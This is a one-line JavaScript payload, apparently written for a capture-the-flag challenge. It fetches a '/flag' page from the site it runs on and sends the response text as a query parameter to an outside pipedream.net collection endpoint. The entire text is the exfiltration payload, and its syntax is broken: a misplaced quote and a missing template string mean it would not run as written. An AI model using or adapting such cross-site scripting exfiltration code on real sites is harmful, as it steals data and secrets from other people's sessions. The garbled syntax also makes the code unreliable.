let flag = fetch('/flag');flag.then(res => res.text()).then(flag => {return fetch('https://eoztzzeai0gupst.m.pipedream.net'/?flag=${flag})})
